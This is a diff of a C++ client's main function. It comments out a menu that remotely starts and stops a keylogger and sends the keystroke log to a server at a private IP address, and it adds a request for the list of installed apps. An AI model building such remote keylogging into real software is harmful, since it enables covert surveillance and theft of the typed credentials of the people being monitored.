@@ -35,28 +35,30 @@ int main(int argc, char* argv[]) {
         Client client("192.168.2.2", 54002);
         if (client.connectToServer()) {
             std::string command;
-            while (true) {
-                std::cout << "Enter 'start' to start keylogger, 'stop' to stop keylogger, or 'exit' to quit: ";
-                std::cin >> command;
+            // // Keylogger
+            // while (true) {
+            //     std::cout << "Enter 'start' to start keylogger, 'stop' to stop keylogger, or 'exit' to quit: ";
+            //     std::cin >> command;
 
-                if (command == "start") {
-                    client.sendKeyloggerStartRequest();
-                    std::cout << "Keylogger started." << std::endl;
-                } 
-                else if (command == "stop") {
-                    client.sendKeyloggerOffRequest();
-                    std::cout << "Keylogger stopped and log file sent to server." << std::endl;
-                } 
-                else if (command == "exit") {
-                    break;  // Exit the loop and end the client session
-                } 
-                else {
-                    std::cout << "Unknown command. Try 'start', 'stop', or 'exit'." << std::endl;
-                }
+            //     if (command == "start") {
+            //         client.sendKeyloggerStartRequest();
+            //         std::cout << "Keylogger started." << std::endl;
+            //     } 
+            //     else if (command == "stop") {
+            //         client.sendKeyloggerOffRequest();
+            //         std::cout << "Keylogger stopped and log file sent to server." << std::endl;
+            //     } 
+            //     else if (command == "exit") {
+            //         break;  // Exit the loop and end the client session
+            //     } 
+            //     else {
+            //         std::cout << "Unknown command. Try 'start', 'stop', or 'exit'." << std::endl;
+            //     }
 
-                // Optional delay between commands
-                std::this_thread::sleep_for(std::chrono::seconds(1));
-            }
+            //     // Optional delay between commands
+            //     std::this_thread::sleep_for(std::chrono::seconds(1));
+            // }
+            client.sendListOfAppRequest();
         }
     } else {
         std::cerr << "Usage: " << argv[0] << " [server | client]" << std::endl;
